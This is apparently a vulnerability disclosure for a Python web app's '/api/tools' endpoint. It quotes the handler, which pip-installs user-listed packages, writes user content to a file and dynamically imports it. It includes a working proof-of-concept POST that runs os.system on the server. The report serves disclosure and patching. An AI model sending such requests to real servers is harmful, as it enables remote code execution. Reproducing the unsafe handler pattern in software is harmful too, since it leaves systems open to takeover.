# Description

Remote-Code Exeution via dynamic module importing | Arbitray File Overwrite | Pip Injection, maintainer should patch these three individual vector and sink to mitigate the possibility of RCE at "/api/tools".

```python
class ToolUploadRequest(BaseModel):
    """Tool upload request."""

    content: str = Field(
        ...,
        description="Content from the tool description file.",
    )
    filename: str = Field(
        ...,
        description="Name of the file.",
    )
    dependencies: t.List[str] = Field(
        ...,
        description="List of dependencies.",
    )
```

```python
    @app.post("/api/tools", response_model=APIResponse[t.List[str]])
    @with_exception_handling
    def _upload_workspace_tools(request: ToolUploadRequest) -> t.List[str]:
        """Get list of available developer tools."""
        if len(request.dependencies) > 0:
            process = subprocess.run(
                args=["pip", "install", *request.dependencies], # sink3 Pip Injection
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            if process.returncode != 0:
                raise RuntimeError(
                    f"Error installing dependencies: {process.stderr.decode()}"
                )

        filename = md5(request.content.encode(encoding="utf-8")).hexdigest()
        tempfile = Path(tooldir.name, f"{filename}.py") # sink2 Path Traversal
        if tempfile.exists():
            raise ValueError("Tools from this module already exits!")

        tempfile.write_text(request.content)
        importlib.import_module(filename) # sink1 dynamic module importing
        return get_runtime_actions()
```

# Proof of Concept

```
import requests

url = "http://127.0.0.1:8000/api"

session = requests.Session()
session.trust_env = False
cont = session.post(
    url = url + '/tools',
    json = {
        'content': "__import__('os').system('mkdir /tmp/reetr0reg')",
        'filename': 'retr0reg',
        'dependencies': ['requests', 'pip'],
    }
)

print(cont.content)
```

# Impact

Remote-Code execution